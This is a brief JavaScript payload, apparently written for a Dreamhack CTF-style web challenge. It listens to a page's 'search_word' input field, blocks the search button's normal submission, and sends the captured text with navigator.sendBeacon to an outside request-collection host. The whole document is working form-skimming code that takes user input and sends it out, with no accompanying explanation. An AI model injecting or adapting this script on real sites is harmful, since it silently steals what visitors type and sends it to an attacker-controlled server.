const search_word = document.getElementsByName("search_word")[0];

var search_keylog = "";

search_word.addEventListener("input", (e) => {
    search_keylog = e.target.value;
});

const search_btn = document.getElementsByTagName("button")[0];

search_btn.addEventListener('click', (e) => {
    e.preventDefault();
    navigator.sendBeacon(
        "https://hbeqqxv.request.dreamhack.games",
        search_keylog
    );
});
